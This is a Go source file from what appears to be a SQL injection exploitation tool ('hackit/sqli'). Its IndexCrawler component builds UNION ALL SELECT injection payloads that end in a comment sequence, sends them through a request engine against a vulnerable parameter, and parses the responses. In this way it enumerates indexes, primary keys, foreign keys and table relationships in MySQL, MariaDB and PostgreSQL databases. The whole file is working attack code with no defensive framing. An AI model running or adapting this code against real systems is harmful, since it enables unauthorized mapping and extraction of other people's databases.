package crawl

import (
	"fmt"
	"strings"
	"hackit/sqli/go/utils"
)

// IndexCrawler extracts index, primary key, foreign key, and constraint information
type IndexCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

func NewIndexCrawler(e EngineInterface) *IndexCrawler {
	return &IndexCrawler{engine: e, log: e.GetLogger()}
}

// ExtractIndexes extracts all indexes from tables in a database
func (ic *IndexCrawler) ExtractIndexes(param, dbms, database string, tables []string) []IndexInfo {
	var allIndexes []IndexInfo

	for _, tbl := range tables {
		indexes := ic.extractTableIndexes(param, dbms, database, tbl)
		allIndexes = append(allIndexes, indexes...)

		fks := ic.extractForeignKeys(param, dbms, database, tbl)
		allIndexes = append(allIndexes, fks...)
	}

	ic.log.Debug(fmt.Sprintf("Found %d indexes in %s", len(allIndexes), database))
	return allIndexes
}

func (ic *IndexCrawler) extractTableIndexes(param, dbms, database, table string) []IndexInfo {
	var indexes []IndexInfo

	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = fmt.Sprintf("SELECT INDEX_NAME, COLUMN_NAME, IFNULL(NON_UNIQUE,1), IFNULL(INDEX_TYPE,''), IFNULL(INDEX_COMMENT,''), SEQ_IN_INDEX FROM INFORMATION_SCHEMA.STATISTICS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' ORDER BY INDEX_NAME, SEQ_IN_INDEX", database, table)
	case strings.Contains(dbms, "PostgreSQL"):
		query = fmt.Sprintf("SELECT i.relname, a.attname, CASE WHEN i.indisunique THEN '0' ELSE '1' END, '', '' FROM pg_index idx JOIN pg_class i ON i.oid=idx.indexrelid JOIN pg_attribute a ON a.attrelid=idx.indrelid AND a.attnum=ANY(idx.indkey) WHERE idx.indrelid='%s'::regclass", table)
	default:
		return indexes
	}

	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := ic.engine.Request(payload, param)
	if err != nil {
		return indexes
	}

	// Parse index data
	idxMap := make(map[string]*IndexInfo)
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 3 {
			idxName := strings.Trim(parts[0], "'\" ")
			colName := strings.Trim(parts[1], "'\" ")
			isUnique := strings.Trim(parts[2], "'\" ") == "0"

			if _, exists := idxMap[idxName]; !exists {
				idxMap[idxName] = &IndexInfo{
					Name:     idxName,
					IsUnique: isUnique,
					IsPK:     strings.ToUpper(idxName) == "PRIMARY" || strings.Contains(strings.ToUpper(idxName), "PK_"),
				}
			}
			idxMap[idxName].Columns = append(idxMap[idxName].Columns, colName)
		}
	}

	for _, idx := range idxMap {
		indexes = append(indexes, *idx)
	}

	return indexes
}

func (ic *IndexCrawler) extractForeignKeys(param, dbms, database, table string) []IndexInfo {
	var fks []IndexInfo

	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = fmt.Sprintf("SELECT CONSTRAINT_NAME, COLUMN_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' AND REFERENCED_TABLE_NAME IS NOT NULL", database, table)
	case strings.Contains(dbms, "PostgreSQL"):
		query = fmt.Sprintf("SELECT con.conname, a.attname, ref_table.relname, ref_a.attname FROM pg_constraint con JOIN pg_class tbl ON con.conrelid=tbl.oid JOIN pg_attribute a ON a.attrelid=tbl.oid AND a.attnum=ANY(con.conkey) JOIN pg_class ref_table ON ref_table.oid=con.confrelid JOIN pg_attribute ref_a ON ref_a.attrelid=ref_table.oid AND ref_a.attnum=ANY(con.confkey) WHERE tbl.relname='%s' AND con.contype='f'", table)
	default:
		return fks
	}

	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := ic.engine.Request(payload, param)
	if err != nil {
		return fks
	}

	fkMap := make(map[string]*IndexInfo)
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 4 {
			fkName := strings.Trim(parts[0], "'\" ")
			colName := strings.Trim(parts[1], "'\" ")
			refTable := strings.Trim(parts[2], "'\" ")
			refCol := strings.Trim(parts[3], "'\" ")

			if _, exists := fkMap[fkName]; !exists {
				fkMap[fkName] = &IndexInfo{
					Name:     fkName,
					IsFK:     true,
					IsUnique: false,
					RefTable: refTable,
					RefColumn: refCol,
				}
			}
			fkMap[fkName].Columns = append(fkMap[fkName].Columns, colName)
		}
	}

	for _, fk := range fkMap {
		fks = append(fks, *fk)
	}

	return fks
}

// ExtractPrimaryKeys extracts only primary key information
func (ic *IndexCrawler) ExtractPrimaryKeys(param, dbms, database string, tables []string) map[string][]string {
	pks := make(map[string][]string)

	for _, tbl := range tables {
		var query string
		switch {
		case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
			query = fmt.Sprintf("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' AND COLUMN_KEY='PRI'", database, tbl)
		default:
			query = fmt.Sprintf("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' AND COLUMN_KEY='PRI'", database, tbl)
		}

		payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
		body, _, _, err := ic.engine.Request(payload, param)
		if err != nil {
			continue
		}

		var cols []string
		lines := strings.Split(body, "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if len(line) > 0 && len(line) < 100 && !strings.HasPrefix(line, "<") {
				cols = append(cols, strings.Trim(line, "'\" "))
			}
		}
		if len(cols) > 0 {
			pks[tbl] = cols
		}
	}

	return pks
}

// BuildRelationMap builds a complete foreign key relationship map
func (ic *IndexCrawler) BuildRelationMap(param, dbms, database string, tables []string) map[string][]string {
	relMap := make(map[string][]string)

	for _, tbl := range tables {
		fks := ic.extractForeignKeys(param, dbms, database, tbl)
		for _, fk := range fks {
			key := fmt.Sprintf("%s.%s", database, tbl)
			ref := fmt.Sprintf("%s.%s (%s)", database, fk.RefTable, fk.RefColumn)
			relMap[key] = append(relMap[key], ref)
		}
	}

	return relMap
}
